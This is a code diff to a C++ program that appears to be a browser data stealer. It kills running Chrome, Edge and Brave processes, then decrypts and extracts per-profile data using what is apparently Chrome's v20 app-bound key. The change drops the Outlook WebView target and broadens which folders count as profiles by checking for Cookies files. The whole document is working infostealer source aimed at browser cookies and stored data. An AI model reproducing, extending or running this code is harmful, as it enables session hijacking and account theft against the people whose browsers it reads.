@@ -52,13 +52,13 @@ int main() {
     std::vector<BrowserConfig> configs = {
         {
             "New Outlook",
-            "olk.exe",
-            {L"C:\\Program Files\\WindowsApps\\Microsoft.OutlookForWindows_8wekyb3d8bbwe\\olk.exe"},
-            "msedge.dll",
+            "",
+            {},
+            "",
             {L"Microsoft", L"Olk", L"EBWebView"},
             "outlook_extract",
             "outlook_tmp",
-            true, false, true
+            false, false, false
         },
         {
             "Google Chrome",
@@ -112,7 +112,6 @@ int main() {
         }
     };
 
-    kill_processes_by_name("olk.exe");
     kill_processes_by_name("chrome.exe");
     kill_processes_by_name("msedge.exe");
     kill_processes_by_name("brave.exe");
@@ -800,7 +799,11 @@ void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const Browse
 
     for (const auto& entry : fs::directory_iterator(user_data)) {
         if (entry.is_directory()) {
-            if (fs::exists(entry.path() / "Preferences")) {
+            bool is_profile = fs::exists(entry.path() / "Preferences") ||
+                             fs::exists(entry.path() / "Cookies") ||
+                             fs::exists(entry.path() / "Network" / "Cookies");
+
+            if (is_profile) {
                 std::string profile_name = entry.path().filename().string();
                 std::cout << "Extracting data for profile: " << profile_name << std::endl;
                 fs::path profile_output = output_root / profile_name;
